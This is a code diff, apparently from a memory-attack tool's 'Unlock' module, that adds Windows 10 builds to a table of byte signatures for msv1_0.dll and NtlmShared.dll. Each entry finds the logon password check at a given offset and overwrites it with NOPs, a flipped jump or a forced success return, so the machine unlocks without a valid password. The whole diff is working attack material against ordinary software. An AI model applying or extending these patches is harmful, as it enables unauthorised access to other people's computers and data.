@@ -129,59 +129,88 @@ NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages
 	return E_FAIL;
 }
 
-#define NUMBER_OF_SIGNATURES 10
+#define NUMBER_OF_SIGNATURES 13
 NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 {
 	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
-		{ .chunk = { // win8.1x64 msv1_0.dll (2014-10-29)
+		// win8.1x64 msv1_0.dll (2014-10-29)
+		{ .chunk = {
 			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0x42, 0xA4 } },
 			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0x46, 0x88 } },
 			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-		{ .chunk = { // win8.1x64 msv1_0.dll (2015-10-30)
+		// win8.1x64 msv1_0.dll (2015-10-30)
+		{ .chunk = {
 			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0xC2, 0x07 } },
 			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0xCE, 0xBC } },
 			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-		{ .chunk = { // win8.1x64 msv1_0.dll (2016-03-16)
+		// win8.1x64 msv1_0.dll (2016-03-16)
+		{ .chunk = {
 			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0x22, 0x04 } },
 			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0xB2, 0xB9 } },
 			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-		{ .chunk = { // win10x64 NtlmShared.dll (2015-07-10)
+		// Windows 10 x64 [NtlmShared.dll (2015-07-10)/10.0.10240.16384]
+		{ .chunk = {
 			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xff, 0x15, 0x4b, 0x1c } },
 			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
 			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-		{ .chunk = { // win10x64 NtlmShared.dll (2015-10-30::10.0.10586.0)
+		// Windows 10 x64 [NtlmShared.dll (2015-10-30)/10.0.10586.0]
+		{ .chunk = {
 			{ .cbOffset = 0x62f,.cb = 4,.pb = { 0xff, 0x15, 0xb3, 0x1b } },
 			{ .cbOffset = 0x638,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
 			{ .cbOffset = 0x638,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-		{ .chunk = { // win10x64 NtlmShared.dll (2016-07-16::10.0.14393.0)
+		// Windows 10 x64 [NtlmShared.dll (2016-07-16)/10.0.14393.0]
+		{ .chunk = {
 			{ .cbOffset = 0x6df,.cb = 4,.pb = { 0xff, 0x15, 0xd3, 0x1b } },
 			{ .cbOffset = 0x6e8,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
 			{ .cbOffset = 0x6e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-		{ .chunk = { // win10x64 NtlmShared.dll (2017-03-18::10.0.15063.0)
+		// Windows 10 x64 [NtlmShared.dll (2017-03-18)/10.0.15063.0]
+		{ .chunk = {
 			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xc5, 0x1c } },
 			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
 			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-		{ .chunk = { // win10x64 NtlmShared.dll (2017-09-29::10.0.16299.15)
+		// Windows 10 x64 [NtlmShared.dll (2019-09-30)/10.0.15063.2106]
+		{.chunk = {
+			{.cbOffset = 0x625,.cb = 4,.pb = { 0xff, 0x15, 0xc5, 0x1c } },
+			{.cbOffset = 0x62e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
+			{.cbOffset = 0x62e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
+		},
+		// Windows 10 x64 [NtlmShared.dll (2017-09-29)/10.0.16299.15]
+		{ .chunk = {
 			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xd5, 0x1c } },
 			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
 			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-        { .chunk = { // win10x64 NtlmShared.dll (2018-04-11::10.0.17134.1)
+		// Windows 10 x64 [NtlmShared.dll (2018-04-11)/10.0.17134.1]
+        { .chunk = {
             { .cbOffset = 0x695,.cb = 4,.pb = { 0xff, 0x15, 0x55, 0x1c } },
             { .cbOffset = 0x69e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
             { .cbOffset = 0x69e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
         },
-		{.chunk = { // win10x64 NtlmShared.dll (2019-10-06::10.0.18362.418)
+		// Windows 10 x64 [NtlmShared.dll (2018-09-15)/10.0.17763.1]
+		{.chunk = {
+			{.cbOffset = 0x740,.cb = 4,.pb = { 0xff, 0x15, 0xb2, 0x1b } },
+			{.cbOffset = 0x749,.cb = 4,.pb = { 0x0f, 0x84, 0x0b, 0xfb } },
+			{.cbOffset = 0x749,.cb = 2,.pb = { 0x0f, 0x85 } } }
+		},
+		// Windows 10 x64 [NtlmShared.dll (2019-03-19)/10.0.18362.1]
+		// Windows 10 x64 [NtlmShared.dll (2019-10-06)/10.0.18362.418]
+		{.chunk = {
 			{.cbOffset = 0x741,.cb = 6,.pb = { 0x32, 0xC0, 0xE9, 0x04, 0xFB, 0xFF } },
 			{.cbOffset = 0x741,.cb = 6,.pb = { 0x32, 0xC0, 0xE9, 0x04, 0xFB, 0xFF } },
 			{.cbOffset = 0x741,.cb = 2,.pb = { 0xb0, 0x01 } } }
+		},
+		// Windows 10 x64 [NtlmShared.dll (2019-12-07)/10.0.19041.1]
+		{.chunk = {
+			{.cbOffset = 0x426,.cb = 5,.pb = { 0x48, 0xff, 0x15, 0x53, 0x20 } },
+			{.cbOffset = 0x435,.cb = 6,.pb = { 0x0f, 0x84, 0xba, 0xfa, 0xff, 0xff } },
+			{.cbOffset = 0x435,.cb = 2,.pb = { 0x0f, 0x85 } } }
 		}
 	};
 	KERNEL_FUNCTIONS2 fnk2;
